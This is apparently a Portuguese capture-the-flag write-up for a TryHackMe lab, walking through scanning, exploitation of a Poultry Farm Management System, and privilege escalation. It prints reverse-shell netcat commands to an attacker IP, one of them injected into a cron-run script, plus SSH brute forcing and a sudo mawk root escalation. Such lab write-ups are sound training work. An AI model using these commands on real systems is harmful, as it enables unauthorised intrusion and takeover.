<h1 align="center">💣 Write-up | 5M1TH - AgroPro (TryHackMe) 🌽</h1>

## 🔍 Varredura
vamos realizar a varredura básica com `nmap` para identificar os serviços disponíveis:

```bash
nmap -sS --open -v -Pn 10.10.20.73 -oN nmap_basic
```
<p align="center"> <img width="1500px" height="392" alt="image" src="https://github.com/user-attachments/assets/ed0a6860-1bc2-4d6a-b489-9fe49bcd7e58" /> </p>

Após identificar portas comuns, realizamos um scan mais agressivo e abrangente para detectar possíveis vetores de ataque em portas não padronizadas

```bash
nmap -sSV --open -p- -v -Pn 10.10.20.73 --min-rate=5000 -oN nmap
```
<p align="center"> <img width="1500px" height="586" alt="image" src="https://github.com/user-attachments/assets/e6d53a63-e6e8-4168-a1af-c39f6e7d738a" /> </p>

## 🔍 Enumeração
Vamos realizar a varredura básica com `nmap` para identificar os serviços disponíveis:

### 🔐 SSH – Porta 22
Fiz uma varredura com alguns scripts do Nmap focados no SSH pra ver se aparecia algo interessante:

```bash
nmap -p 22 --script ssh* 10.10.20.73 -v
```
<p align="center"> <img width="1500px" height="481" alt="image" src="https://github.com/user-attachments/assets/8550647a-d39a-48b5-a3a7-bcd5c1f0d238" /> </p>

Depois de algumas tentativas de brute force que não deram em nada, a enumeração do SSH acabou revelando algo mais útil.

<p align="center"> <img width="1500px" alt="image" src="https://github.com/user-attachments/assets/cb11a051-8920-40e9-af03-fa457869b422" /> </p>

✅ Começou a dar bom! Descobrimos os métodos de autenticação e vimos que o acesso por usuário e senha está liberado.

### 🔐 HTTP – Porta 80
Durante a etapa de scanning, encontramos a porta 80 aberta que geralmente indica um serviço web. Ao acessar via navegador, nos deparamos com essa página:

<p align="center"> <img width="1500px" height="645" alt="image" src="https://github.com/user-attachments/assets/e5037c39-4369-4e7c-8c15-d3963538a833" /> </p>

Pra entender melhor o que estava rodando ali, rodamos alguns scripts do Nmap voltados ao protocolo HTTP:

```BASH
nmap -p 80 --script http-methods,http-headers,http-enum 10.10.20.73 -v
```
Além de descobrir os métodos HTTP permitidos, também conseguimos pescar alguns diretórios interessantes no meio da enumeração.

Pra tentar achar mais coisa escondida, resolvi partir pro brute force de diretórios. Comecei pela wordlist mais básica, a common.txt do Dirb só pra ver se tinha algo interessante:

````bash
gobuster dir -eu http://10.10.20.73 -w /usr/share/wordlists/dirb/common.txt -e --no-error -t 100
````
<p align="center"> <img width="1500px" height="517" alt="image" src="https://github.com/user-attachments/assets/2eade400-a3c0-4cb9-af94-09e53ccfd136" /></p>

Como nada muito útil apareceu, resolvi apelar pra big.txt, que costuma achar mais coisa:

````bash
gobuster dir -eu http://10.10.20.73 -w /usr/share/wordlists/dirb/big.txt -e --no-error -t 100
````
<p align="center"> <img width="1500px" height="499" alt="image" src="https://github.com/user-attachments/assets/3b9e5d1d-701a-4058-b12b-8974d393ee44" /> </p>

Nas dicas da máquina, foi citado que está rodando um `Poultry Farm Management System v1.0`. Com essa informação em mente, o diretório `/ranch` me chamou atenção:

<p align="center"> <img width="1500px" height="669" alt="image" src="https://github.com/user-attachments/assets/ccf671ba-1da3-4a1e-96c0-d1c6eabdc92a" /> </p>

Pra entender melhor o que estava por trás desse diretório, rodei o whatweb, que é uma ferramenta ótima pra identificar tecnologias web usadas no servidor:

````bash
whatweb http://10.10.20.73/ranch/
````

<p align="center"> <img width="1500px" height="105" alt="image" src="https://github.com/user-attachments/assets/43dff6a6-bc75-42f4-939c-11609e7d4ce9" /> </p>

## 🔍 Exploração

Como a própria room já entrega qual script devemos usar pra explorar a falha, só precisamos fazer uns ajustes rápidos pra que ele funcione corretamente.
Teremos que alterar três linhas:

<p align="center"> <img width="1500px" height="910" alt="image" src="https://github.com/user-attachments/assets/38497ec3-56a6-4701-84e3-dedc1eeb9eeb" /></p>

Com tudo ajustado, é só rodar:

````bash
python3 red.py
````
<p align="center"> <img width="1500px" height="247" alt="image" src="https://github.com/user-attachments/assets/311f64df-e849-4803-a391-eb758f886bc1" /></p>
Pronto! Já garantimos uma shell como www-data.

Agora, bora pegar uma shell reversa mais confortável.
Primeiro, iniciamos o listener no Kali:

````bash
nc -nlvp 445
````
<p align="center"> <img width="1500px" height="84" alt="image" src="https://github.com/user-attachments/assets/86c9b2b3-a377-436d-89a0-21860097f787" /></p>

Depois, do lado da vítima:

````bash
nc 10.21.173.102 445 -e /bin/bash
````
Conexão recebida com sucesso:
<p align="center"> <img width="1500px" height="135" alt="image" src="https://github.com/user-attachments/assets/4edbc4e9-34f3-4eb2-a9f6-d57f6a73f892" /></p>

Pra fechar, spawnamos uma shell interativa e ta na mão.

## 🕵️‍♂️ Pós-exploração

Logo de cara, fiz uma enumeração básica e... surpresa! Achamos as credenciais do banco de dados:

<p align="center"> <img width="1500px" height="133" alt="image" src="https://github.com/user-attachments/assets/5310e9b0-9119-4c0e-80bb-f14bffc527ed" /></p>

Também verifiquei os perfis disponíveis em /home e criei uma wordlist com os nomes dos perfis

Com isso em mãos, fiz um brute force no serviço SSH que já tínhamos mapeado:

```bash
hydra -L user -p [Senha] 10.10.114.5 ssh
```
<p align="center"> <img width="1500px" height="242" alt="image" src="https://github.com/user-attachments/assets/870a6202-1273-4b92-aa2b-7e2d29275d63" /></p>

🎉 Primeira flag conquistada:

<p align="center"> <img width="1500px" height="227" alt="image" src="https://github.com/user-attachments/assets/396cdb1b-da85-4880-8b49-ae389799e953" /></p>

Dando aquela checada no crontab, encontramos um script sendo executado com permissão do usuário smith:

```bash
cat /etc/crontab
```
<p align="center"> <img width="1500px" height="389" alt="image" src="https://github.com/user-attachments/assets/b16825b1-08a7-4e97-80c9-a37a110fa911" /></p>

Inserimos uma reverse shell no script e preparamos o listener:

```bash
echo "nc 10.21.173.102 9001 -e /bin/bash" >> /opt/backups/.scripts/.script
````
📸 Payload injetado:
<p align="center"> <img width="1500px" height="121" alt="image" src="https://github.com/user-attachments/assets/2ee5a372-2e5c-40bf-be74-d9ddc8976b5c" /></p>

💥 E com isso, ganhamos acesso como smith e pegamos a segunda flag
<p align="center"> <img width="1500px" height="255" alt="image" src="https://github.com/user-attachments/assets/307854aa-7439-4898-b02b-e3175d09aa78" /></p>

Com o acesso ao usuário smith, a próxima missão era bem clara: virar root 👑

Essa foi a parte mais tranquila...

```bash
sudo -l
```
<p align="center"> <img width="1500px" height="162" alt="image" src="https://github.com/user-attachments/assets/ab18a005-3aa0-4dec-8eee-d30717944a26" /></p>

O usuário smith pode rodar o binário mawk como root, sem precisar de senha.
E adivinha? O mawk aceita execução de comandos via system()
Pra isso, bastou rodar:

```bash
sudo mawk 'BEGIN {system("/bin/bash")}'
```
<p align="center"> <img width="1500px" height="51" alt="image" src="https://github.com/user-attachments/assets/15fc2667-1e3a-4a7a-8399-fe1e01354c8f" /></p>

👑 Agora sim, root na mão!

Com acesso root, foi só ir direto na `/root` e pegar a flag final:

<p align="center"> <img width="1500px" height="293" alt="image" src="https://github.com/user-attachments/assets/9d9bc899-7993-45a9-90da-f277b22105c9" /></p>

